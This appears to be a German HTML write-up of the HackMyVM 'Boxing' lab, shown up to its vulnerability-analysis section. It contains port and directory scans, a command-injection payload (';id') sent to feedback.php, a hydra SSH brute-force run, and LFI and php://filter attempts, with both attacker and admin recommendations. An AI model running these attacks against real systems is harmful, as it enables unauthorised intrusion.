@@ -1,0 +1,1674 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boxing - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- KEIN <style>-Block hier -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Boxing - HackMyVM- Level: Medium - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad-Überschrift und Kreis gemäß Template und CSS -->
+            <h2>Medium</h2> <!-- Nur der Text, Farbe sollte Gelb sein (via CSS) -->
+            <div class="circle"> <!-- Keine zusätzlichen Klassen -->
+                <div class="segment segment-1"></div> <!-- Farbe sollte Gelb sein (via CSS) -->
+                <div class="segment segment-2"></div> <!-- Farbe sollte Gelb sein (via CSS) -->
+                <div class="segment segment-3"></div> <!-- Farbe sollte Gelb sein (via CSS) -->
+                <div class="inner"></div> <!-- Hintergrundfarbe kommt aus CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Burp Suite (impliziert)</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">head</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
+                <li><a href="#staging-environment-analysis">Staging Environment Analysis</a></li>
+                <li><a href="#ssrf-and-rce">SSRF and RCE via Staging</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-incron">Proof of Concept (PrivEsc via Incron)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="comment">Beginn mit ARP-Scan zur Identifizierung aktiver Hosts im lokalen Netzwerk.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.114	08:00:27:e1:99:e2	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `arp-scan -l` identifiziert erfolgreich einen Host mit der IP 192.168.2.114. Die MAC-Adresse (08:00:27:e1:99:e2) und der Hersteller (PCS Systemtechnik GmbH) deuten auf eine VirtualBox VM hin.</p>
+            <p class="evaluation">**Bewertung:** Zielsystem im Netzwerk lokalisiert. Der Hinweis auf VirtualBox gibt ersten Kontext.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere weitere Scans auf 192.168.2.114.
+            <br>**Empfehlung (Admin):** Standard-Netzwerküberwachung und Segmentierung können die Erkennung erschweren.</p>
+
+            <p class="comment">Eintrag in die lokale Hosts-Datei zur Namensauflösung. Der `vi`-Befehl selbst ist im Log auskommentiert, aber der resultierende Eintrag wird gezeigt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># vi /etc/hosts</span></div>
+                    <pre>
+
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+
+        #       192.168.2.104   zon.hmv
+        #       192.168.2.105   king.vln
+        #       192.168.2.106   avengers.vln
+        #       192.168.2.107   universe.hmv
+        #       192.168.2.108   library.vln
+        #       192.168.2.109	lampiano.vln
+        #       192.168.2.110   infosecwarrior.vln
+        #       192.168.2.111   espo.hmv
+        #       192.168.2.112   easy.vln skymbu.info
+        #       192.168.2.113   messiah.vln
+                192.168.2.114   boxing.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei wurde (vermutlich manuell, da der `vi`-Befehl auskommentiert ist) bearbeitet, um der IP-Adresse 192.168.2.114 den Hostnamen `boxing.hmv` zuzuweisen. Dies erleichtert die Verwendung des Namens in nachfolgenden Schritten.</p>
+            <p class="evaluation">**Bewertung:** Eine praktische Maßnahme zur Verbesserung der Lesbarkeit und Handhabung während des Tests.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwende `boxing.hmv` als Zielbezeichnung in weiteren Befehlen.
+            <br>**Empfehlung (Admin):** Keine serverseitigen Maßnahmen erforderlich, da dies eine lokale Konfiguration des Angreifers ist.</p>
+
+            <p class="comment">Durchführung eines vollständigen Nmap-Scans über alle Ports mit Service-Version, OS-Erkennung und Standard-Skripten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.114 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 22:29 CEST
+Nmap scan report for boxing (192.168.2.114)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey:
+|   256 dd:74:2f:1c:d1:23:f6:1f:dd:3a:52:94:5d:8b:7c:d9 (ECDSA)
+|_  256 96:fb:74:b2:7d:ac:66:40:e9:94:df:83:9a:a6:07:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Oxer
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 08:00:27:E1:99:E2 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms boxing (192.168.2.114)</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sV`, `-AO`, `-T5`, `-p-`) identifiziert zwei offene TCP-Ports:
+            <ul>
+                <li>**Port 22 (SSH):** Läuft OpenSSH Version 9.2p1 auf Debian. Die Host-Schlüssel werden angezeigt.</li>
+                <li>**Port 80 (HTTP):** Läuft Apache httpd Version 2.4.57 auf Debian. Der Titel der Webseite ist "Oxer".</li>
+            </ul>
+            Die OS-Erkennung deutet auf ein Linux-System hin. Die MAC-Adresse bestätigt erneut VirtualBox.</p>
+            <p class="evaluation">**Bewertung:** Die primären Angriffsvektoren sind SSH (Port 22) und der Webserver (Port 80). Die Versionsinformationen sind nützlich für die Suche nach bekannten Schwachstellen. Der Titel "Oxer" ist zu notieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führe detailliertere Scans und Analysen für Port 80 (Nikto, Gobuster, manuelle Prüfung) und Port 22 (Benutzer-Enumeration, Brute-Force, bekannte Schwachstellen) durch.
+            <br>**Empfehlung (Admin):** Stelle sicher, dass SSH und Apache sicher konfiguriert sind. Halte die Software auf dem neuesten Stand.</p>
+
+            <p class="comment">Gefilterte Nmap-Ausgabe zur Übersicht der offenen Ports.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.114 -p- | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die mit `grep open` gefilterte Ausgabe des vorherigen Nmap-Scans bestätigt übersichtlich die beiden offenen Ports 22 (SSH) und 80 (HTTP).</p>
+            <p class="evaluation">**Bewertung:** Bietet eine schnelle Referenz der offenen Ports.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere dich auf diese beiden Ports.
+            <br>**Empfehlung (Admin):** Keine zusätzlichen Maßnahmen basierend auf dieser gefilterten Ansicht.</p>
+
+            <p class="comment">Mysteriöser Eintrag "Joniya Daro" im Log.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl, nur Text im Log -->
+                    <pre>Joniya Daro</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Die Zeichenkette "Joniya Daro" erscheint im Log ohne ersichtlichen Kontext oder Bezug zu den vorherigen oder nachfolgenden technischen Befehlen. Es könnte sich um eine Notiz, einen Benutzernamen, einen Dateinamen oder einen irrelevanten Artefakt handeln.</p>
+            <p class="evaluation">**Bewertung:** Unklar, möglicherweise ein Hinweis. Wird vorerst zur Kenntnis genommen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Behalte den Namen im Hinterkopf, falls er später relevant wird (z.B. als Benutzername für SSH-Brute-Force).
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">Durchführung eines Nikto-Scans gegen den Webserver auf Port 80.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.114</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.114
++ Target Hostname:    192.168.2.114
++ Target Port:        80
++ Start Time:         2024-04-28 22:31:36 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 5d2e, size: 61090ae116296, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /images/: Directory indexing found.
++ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2024-04-28 22:31:45 (GMT2) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Nikto-Scan liefert folgende Informationen:
+            <ul>
+                <li>Server: Apache/2.4.57 (Debian).</li>
+                <li>Fehlende Security Header: `X-Frame-Options`, `X-Content-Type-Options`.</li>
+                <li>Potenzielles Inode-Leak über ETags (geringes Risiko).</li>
+                <li>Erlaubte HTTP-Methoden: GET, POST, OPTIONS, HEAD.</li>
+                <li>Directory Indexing: Die Verzeichnisse `/css/` und `/images/` sind auflistbar. `/css/` wird als potenziell interessant markiert.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Mittel. Fehlende Header sind Best-Practice-Verstöße. Das Directory Indexing ist ein wichtiger Fund und sollte untersucht werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche die Inhalte der Verzeichnisse `/css/` und `/images/` manuell. Führe weitere Verzeichnis-Scans mit umfassenderen Wordlists durch.
+            <br>**Empfehlung (Admin):** Deaktiviere Directory Indexing (`Options -Indexes`). Implementiere die fehlenden Security-Header.</p>
+
+            <p class="comment">Verzeichnis-Scan mit `dirb`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://192.168.2.114</span></div>
+                    <pre>
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Apr 28 22:31:01 2024
+URL_BASE: http://192.168.2.114/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4622
+
+---- Scanning URL: http://192.168.2.114/ ----
+==> DIRECTORY: http://192.168.2.114/images/
+==> DIRECTORY: http://192.168.2.114/css/
++ http://192.168.2.114/index.html (CODE:200|SIZE:23854)
+==> DIRECTORY: http://192.168.2.114/js/
++ http://192.168.2.114/server-status (CODE:403|SIZE:278)
+
+---- Entering directory: http://192.168.2.114/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.114/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://192.168.2.114/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Sun Apr 28 22:31:06 2024
+DOWNLOADED: 4622 - FOUND: 2</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `dirb` mit der Standard-Wordlist findet die Verzeichnisse `/images/`, `/css/` und `/js/` sowie die Datei `index.html`. Es bestätigt, dass die gefundenen Verzeichnisse auflistbar sind ("Directory IS LISTABLE"). Der Zugriff auf `/server-status` wird verweigert (403).</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Ergebnisse von Nikto bezüglich Directory Indexing und findet zusätzlich das Verzeichnis `/js/`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche die Inhalte von `/images/`, `/css/` und `/js/`. Verwende Gobuster/ffuf für eine gründlichere Suche nach Dateien und Verzeichnissen.
+            <br>**Empfehlung (Admin):** Deaktiviere Directory Indexing dringend.</p>
+
+            <p class="comment">HTTP POST Request an `feedback.php` mit Command Injection Versuch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Shell-Befehl, sondern HTTP Request Log -->
+                    <pre>
+POST /feedback.php HTTP/1.1
+Host: 192.168.2.114
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+Origin: http://192.168.2.114
+Connection: close
+Referer: http://192.168.2.114/feedback.php
+Upgrade-Insecure-Requests: 1
+
+feedback=%3Bid%0D%0A</pre>
+<!-- URL-dekodiert: feedback=;id\r\n -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Dieses Log zeigt einen HTTP POST Request, der an `/feedback.php` gesendet wurde. Der `feedback`-Parameter enthält den URL-kodierten Wert `;id\r\n`. Dies ist ein Versuch, einen Shell-Befehl (`id`) durch Semikolon-Trennung nach einer potenziell vorhandenen Server-seitigen Funktion einzuschleusen.</p>
+            <p class="evaluation">**Bewertung:** Dokumentiert einen Command Injection Versuch gegen `feedback.php`. Das Ergebnis des Versuchs (die Server-Antwort) ist jedoch nicht im Log enthalten, daher ist der Erfolg oder Misserfolg unbekannt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führe systematische Tests auf Command Injection in `feedback.php` durch und analysiere die Antworten sorgfältig. Teste verschiedene Payloads (z.B. `| id`, `` `id` ``). Finde `feedback.php` zuerst mit Gobuster/ffuf.
+            <br>**Empfehlung (Admin):** Implementiere strikte Eingabevalidierung und -sanitisierung für den `feedback`-Parameter. Verwende keine Shell-Befehle mit Benutzereingaben.</p>
+
+            <p class="comment">Umfassender Verzeichnis- und Datei-Scan mit `gobuster`.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://boxing.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <!-- -k ist hier überflüssig -->
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://boxing.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js
+[+] Expanded:                true
+[+] Ignore TLS Errors:       true
+[+] No Error:                true
+[+] Timeout:                 10s
+===============================================================
+2024/04/28 22:35:01 Starting gobuster in directory enumeration mode
+===============================================================
+http://boxing.hmv/index.html           (Status: 200) [Size: 23854]
+http://boxing.hmv/images               (Status: 301) [Size: 309] [--> http://boxing.hmv/images/]
+http://boxing.hmv/about.html           (Status: 200) [Size: 9704]
+http://boxing.hmv/blog.html            (Status: 200) [Size: 11165]
+http://boxing.hmv/feedback.php         (Status: 200) [Size: 1616]
+http://boxing.hmv/css                  (Status: 301) [Size: 306] [--> http://boxing.hmv/css/]
+http://boxing.hmv/js                   (Status: 301) [Size: 305] [--> http://boxing.hmv/js/]
+http://boxing.hmv/class.html           (Status: 200) [Size: 12460]
+===============================================================
+2024/04/28 22:40:01 Finished
+===============================================================</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster mit einer mittelgroßen Wordlist und vielen Dateiendungen findet:
+            <ul>
+                <li>HTML-Seiten: `index.html`, `about.html`, `blog.html`, `class.html`.</li>
+                <li>PHP-Seite: `feedback.php`.</li>
+                <li>Verzeichnisse: `/images/`, `/css/`, `/js/` (bestätigt vorherige Scans).</li>
+            </ul>
+            Es werden keine weiteren versteckten Dateien oder Verzeichnisse aufgedeckt.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die bekannte Struktur und hebt `feedback.php` erneut hervor. Die Webseite scheint relativ klein zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Konzentriere dich auf die Analyse von `feedback.php` und die Inhalte der gefundenen HTML-Seiten (Suche nach Kommentaren, Links, Hinweisen).
+            <br>**Empfehlung (Admin):** Stelle sicher, dass alle exponierten Dateien und Verzeichnisse notwendig sind und keine sensiblen Informationen enthalten.</p>
+
+            <p class="comment">Zusammenfassung der auf der Webseite erkannten Technologien (vermutlich durch Browser-Plugins oder manuelle Analyse).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Befehl, sondern Auflistung von Technologien -->
+                    <pre>
+Schrift Script
+Google Font API
+
+Web Server
+Apache HTTP Server 2.4.57
+
+Programmiersprache
+PHP
+
+Betriebssysteme
+Debian
+
+CDN
+cdnjs
+Cloudflare
+
+Karten
+Google Maps
+
+JavaScript Bibliotheken
+jQuery 3.4.1
+OWL Carousel
+
+UI Frameworks
+Bootstrap 4.3.1</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Diese Liste fasst die auf der Webseite identifizierten Technologien zusammen. Dazu gehören serverseitige Komponenten (Apache, PHP, Debian) und clientseitige Bibliotheken/Dienste (Google Fonts, CDNs, Google Maps, jQuery, OWL Carousel, Bootstrap).</p>
+            <p class="evaluation">**Bewertung:** Nützlicher Überblick über den Technologie-Stack. Bestätigt Apache/PHP/Debian. Die clientseitigen Bibliotheken könnten eigene Schwachstellen haben (z.B. veraltetes jQuery), sind aber für den direkten Serverzugriff meist weniger relevant.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Suche nach bekannten Schwachstellen für Apache 2.4.57, PHP (Version unbekannt) und die spezifischen JavaScript-Bibliotheken/Frameworks.
+            <br>**Empfehlung (Admin):** Halte alle Komponenten (Server, PHP, JS-Bibliotheken) auf dem neuesten Stand.</p>
+
+            <p class="comment">Abgebrochener Versuch, SSH-Passwörter für den Benutzer `daro` mit Hydra zu knacken.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># hydra -l daro -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.114:22 -t 64</span></div>
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-02 20:35:41
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344496 login tries (l:1/p:14344496), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.114:22/
+[STATUS] 420.00 tries/min, 420 tries in 00:01h, 14344101 to do in 569:13h, 39 active
+[STATUS] 258.00 tries/min, 774 tries in 00:03h, 14343756 to do in 926:36h, 30 active
+[STATUS] 187.71 tries/min, 1314 tries in 00:07h, 14343228 to do in 1273:30h, 18 active
+[STATUS] 149.80 tries/min, 2247 tries in 00:15h, 14342295 to do in 1595:43h, 18 active
+[STATUS] 132.39 tries/min, 4104 tries in 00:31h, 14340438 to do in 1805:23h, 18 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Ein Hydra-Befehl zum Brute-Forcen des SSH-Passworts für den Benutzer `daro` (vermutlich aus dem "Joniya Daro"-Hinweis) wird gezeigt, ist aber auskommentiert (`#`). Die nachfolgende Ausgabe zeigt jedoch, dass Hydra gestartet und dann manuell mit Strg+C (`^C`) abgebrochen wurde. Es wurden über 4000 Passwörter aus `rockyou.txt` probiert, ohne Erfolg.</p>
+            <p class="evaluation">**Bewertung:** Der Brute-Force-Versuch für `daro` war erfolglos (abgebrochen). SSH scheint nicht leicht zugänglich zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** SSH-Brute-Force ist oft zeitaufwendig und laut. Konzentriere dich auf die Webanwendung, es sei denn, es gibt starke Hinweise auf schwache SSH-Passwörter oder spezifische Benutzer.
+            <br>**Empfehlung (Admin):** Implementiere SSH-Härtungsmaßnahmen wie Fail2ban, Key-basierte Authentifizierung und Deaktivierung der Passwort-Authentifizierung.</p>
+
+        </section>
+
+       <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis</h2>
+
+             <p class="comment">Erneuter fehlgeschlagener Versuch, eine WordPress-Konfigurationsdatei mittels Path Info zu laden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.114//feedback.php/wordpress/wp-config.php_bak</span></div>
+                     <pre>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Feedback Form&lt;/title&gt;
+    &lt;style&gt;
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0a0a0a; /* Dark background */
+            color: #ffffff; /* White text */
+            text-align: center;
+        }
+        form {
+            background-color: #0a0a0a; /* Dark background */
+            border: 3px solid #6dbf47; /* Green border */
+            padding: 20px;
+            display: inline-block;
+            margin-top: 50px;
+        }
+        label, textarea, input[type="submit"] {
+            display: block;
+            margin-bottom: 10px;
+            color: #ffffff; /* White text */
+        }
+        textarea, input[type="submit"] {
+            width: 300px;
+            border: 1px solid #6dbf47; /* Green border */
+    	    color: #6dbf47; /* Green text or choose any color you prefer */
+            background-color: #0a0a0a; /* Dark background */
+        }
+        input[type="submit"] {
+            background-color: #6dbf47; /* Green background */
+            color: #0a0a0a; /* Dark text */
+            padding: 5px 15px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #89e57f; /* Lighter green background */
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2 style="color: #6dbf47;"&gt;Feedback Form&lt;/h2&gt;
+
+    &lt;form method="post" action="/feedback.php/wordpress/wp-config.php_bak"&gt;
+        &lt;label for="feedback"&gt;Your Feedback :&lt;/label&gt;&lt;br&gt;
+        &lt;textarea id="feedback" name="feedback" rows="4" cols="50"&gt;&lt;/textarea&gt;&lt;br&gt;
+        &lt;input type="submit" value="Send"&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Es wird erneut versucht, eine `wp-config.php_bak`-Datei über den Path-Info-Teil der URL (`/feedback.php/...`) zu laden. Wie zuvor gibt der Server nur das HTML des Feedback-Formulars zurück.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass diese Methode zur Dateieinbindung nicht funktioniert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussiere dich auf andere LFI-Methoden, z.B. über Parameter.
+            <br>**Empfehlung (Admin):** Keine zusätzlichen Maßnahmen erforderlich.</p>
+
+             <p class="comment">Herunterladen des HTML-Formulars mit `wget`, was den fehlgeschlagenen LFI-Versuch bestätigt.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.114//feedback.php/wordpress/wp-config.php_bak</span></div>
+                     <pre>
+--2024-04-02 21:19:39--  http://192.168.2.114//feedback.php/wordpress/wp-config.php_bak
+Verbindungsaufbau zu 192.168.2.114:80 â€¦ verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet â€¦ 200 OK
+LÃ¤nge: 1644 (1,6K) [text/html]
+Wird in Â»wp-config.php_bakÂ« gespeichert.
+
+wp-config.php_bak                               100%[=====================================================================================================&gt;]   1,61K  --.-KB/s    in 0s
+
+2024-04-02 21:19:39 (251 MB/s) - Â»wp-config.php_bakÂ« gespeichert [1644/1644]</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** `wget` wird für denselben LFI-Versuch wie zuvor verwendet. Es lädt erfolgreich eine Datei herunter, die jedoch nur 1.6K groß ist und als `text/html` identifiziert wird. Dies ist das Feedback-Formular, nicht die gesuchte Konfigurationsdatei.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt erneut das Scheitern des LFI-Versuchs über Path Info.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** LFI über Path Info aufgeben.
+            <br>**Empfehlung (Admin):** Keine Maßnahmen erforderlich.</p>
+
+            <p class="comment">Versuche, mit `wfuzz` Parameter für LFI zu finden, scheitern.</p>
+ 
+            <p class="analysis">**Analyse:** Mehrere `wfuzz`-Läufe werden durchgeführt, um LFI-Schwachstellen zu finden:
+            <ol>
+                <li>Fuzzing des Parameter*namens* (`FUZZ=../../../../etc/passwd`) mit einer mittleren Wordlist.</li>
+                <li>Fuzzing des Parameter*namens* (`FUZZ=../../../../etc/passwd`) mit einer großen Wordlist.</li>
+                <li>Fuzzing des Parameter*wertes* für `feedback` (`feedback=FUZZ`) mit einer Liste von Logdateinamen.</li>
+            </ol>
+            Alle Versuche scheitern; es werden keine Payloads gefunden, die eine andere Antwort als die Standardantwort (gefiltert durch `--hw 152`) hervorrufen.</p>
+            <p class="evaluation">**Bewertung:** LFI scheint über die getesteten Parameter und Payloads in `feedback.php` nicht möglich zu sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuche andere Seiten (`index.html`, `about.html` etc.) oder konzentriere dich auf die Staging-Umgebung, falls vorhanden.
+            <br>**Empfehlung (Admin):** Keine direkten Maßnahmen erforderlich.</p>
+
+            <p class="comment">Erneuter Versuch, den Quellcode von `feedback.php` mittels LFI und PHP-Filter zu lesen (Ergebnis fehlt).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Befehl, sondern HTTP Request Log -->
+                    <pre>
+GET /feedback.php?feedback=php://filter/convert.base64-encode/resource=feedback.php HTTP/1.1
+Host: 192.168.2.114
